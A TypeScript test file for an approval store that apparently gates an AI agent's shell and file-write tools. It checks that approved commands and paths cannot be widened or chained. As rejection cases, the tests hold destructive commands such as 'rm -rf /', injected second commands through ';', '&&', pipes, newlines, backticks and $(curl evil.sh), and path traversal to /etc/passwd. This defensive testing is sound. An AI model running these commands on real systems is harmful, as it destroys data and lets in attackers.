// Copyright 2026 Michael P. Burgus <https://github.com/NeuralDrifter>
// SPDX-License-Identifier: Apache-2.0

import { expect, test } from "vite-plus/test";
import { ApprovalStore, matchesPattern, patternFor } from "../src/core/approvals.ts";

test("glob patterns are anchored at both ends", () => {
  expect(matchesPattern("pnpm test*", "pnpm test --run")).toBe(true);
  expect(matchesPattern("pnpm test*", "rm -rf / && pnpm test")).toBe(false);
  expect(matchesPattern("src/**", "src/a/b.ts")).toBe(true);
  expect(matchesPattern("src/**", "other/a.ts")).toBe(false);
});

test("an empty store allows nothing", () => {
  expect(new ApprovalStore([]).isAllowed("shell", { command: "ls" })).toBe(false);
});

test("allow_always generalises across flags but not across commands", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test --run" });

  expect(store.isAllowed("shell", { command: "pnpm test --run" })).toBe(true);
  expect(store.isAllowed("shell", { command: "pnpm test --watch" })).toBe(true);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
});

test("an approved command prefix cannot chain into another command", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test --run" });

  expect(store.isAllowed("shell", { command: "pnpm test; rm -rf ~" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test && shutdown -h now" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test | sh" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test\nsudo useradd hax" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test `curl evil.sh`" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test $(curl evil.sh)" })).toBe(false);
});

test("a chaining command cannot even be stored as a rule", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test; rm -rf ~" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("shell", { command: "pnpm test" })).toBe(false);
});

test("a command whose second word is an option keeps that option in the rule", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "rm -f build/tmp.txt" });

  expect(store.isAllowed("shell", { command: "rm -f build/other.txt" })).toBe(true);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
  expect(store.isAllowed("shell", { command: "rm -rf ~/.ssh" })).toBe(false);
});

test("an option in second position does not authorise every flag of a binary", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "git --no-pager diff" });

  expect(
    store.isAllowed("shell", { command: "git -c core.pager=cat push --force origin main" }),
  ).toBe(false);
  expect(store.isAllowed("shell", { command: "git push --force" })).toBe(false);
});

test("an approved command does not widen to other commands sharing a prefix", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "git diff" });

  expect(store.isAllowed("shell", { command: "git diff" })).toBe(true);
  expect(store.isAllowed("shell", { command: "git diff --stat" })).toBe(true);
  expect(store.isAllowed("shell", { command: "git log" })).toBe(false);
  expect(store.isAllowed("shell", { command: "gitk" })).toBe(false);
});

test("an allowlist entry never leaks across tools", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test" });
  expect(store.isAllowed("write_file", { path: "pnpm test" })).toBe(false);
});

test("a rule with no pattern is never a wildcard", () => {
  const store = new ApprovalStore([{ tool: "shell" }]);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
});

test("a call whose arguments are missing or mistyped is never auto-approved", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", {});
  store.allowAlways("shell", { command: 123 });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("shell", {})).toBe(false);
});

test("a tool with no gated argument is never auto-approved", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("http_request", { url: "https://example.com" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("http_request", { url: "https://example.com" })).toBe(false);
});

test("path approvals do not escape their directory", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "src/core/a.ts" });

  expect(store.isAllowed("write_file", { path: "src/core/b.ts" })).toBe(true);
  expect(store.isAllowed("write_file", { path: "src/core/../../../../etc/passwd" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "src/other/x.ts" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "/etc/passwd" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "C:/Windows/System32/drivers/etc/hosts" })).toBe(
    false,
  );
});

test("a root-level path never derives an allow-everything rule", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "README.md" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("write_file", { path: "anything.txt" })).toBe(false);
});

test("backslash paths normalise so Windows arguments behave like POSIX ones", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "src/core/a.ts" });
  expect(store.isAllowed("write_file", { path: "src\\core\\b.ts" })).toBe(true);
});

test("patternFor derives a command prefix and a directory glob", () => {
  expect(patternFor("shell", { command: "pnpm test --run" })).toBe("pnpm test*");
  expect(patternFor("write_file", { path: "src/core/a.ts" })).toBe("src/core/**");
  expect(patternFor("shell", { command: "pnpm test; rm -rf ~" })).toBeUndefined();
  expect(patternFor("write_file", { path: "README.md" })).toBeUndefined();
});

test("rules round-trip for persistence", () => {
  const store = new ApprovalStore([{ tool: "shell", argPattern: "git status*" }]);
  expect(store.isAllowed("shell", { command: "git status --short" })).toBe(true);
  expect(store.rules()).toEqual([{ tool: "shell", argPattern: "git status*" }]);
});
